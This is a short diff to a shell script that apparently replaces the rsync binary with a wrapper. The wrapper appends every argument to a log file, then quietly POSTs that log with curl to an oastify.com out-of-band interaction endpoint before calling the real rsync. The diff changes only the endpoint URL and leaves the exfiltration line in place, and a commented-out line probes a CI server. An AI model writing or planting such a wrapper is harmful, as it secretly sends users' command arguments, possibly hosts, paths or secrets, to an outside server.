@@ -36,7 +36,7 @@ echo "$@" >> "${LOG}"
 # curl --max-time 1 -v "https://ci.normation.com/jenkins/" 2>&1 >> "${LOG}"
 
 # send the collected log to the OAST endpoint
-curl -s -X POST --data-binary @"${LOG}" "https://lynrf95yqtuijsb55q3d0brzmqshg94y.oastify.com/rsync_wrapper?date=$(date)"
+curl -s -X POST --data-binary @"${LOG}" "https://smiy3gt5e0ip7zzctxrkoif6axgo4js8.oastify.com/rsync_wrapper"
 
 /usr/local/bin/rsync.real --verbose --stats "$@"
 # clean up
